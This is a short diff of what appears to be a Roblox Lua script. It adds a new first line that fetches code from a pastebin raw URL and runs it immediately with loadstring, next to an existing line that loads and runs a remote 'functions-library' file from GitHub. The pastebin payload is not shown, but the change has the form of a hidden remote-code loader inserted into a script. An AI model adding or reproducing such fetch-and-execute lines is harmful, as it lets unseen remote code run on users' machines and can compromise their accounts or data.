@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/cCV7hViz'))()
 local start = tick()
 
 loadstring(game:HttpGet"https://github.com/webhooking2022/functions-library/raw/main/.functions")()
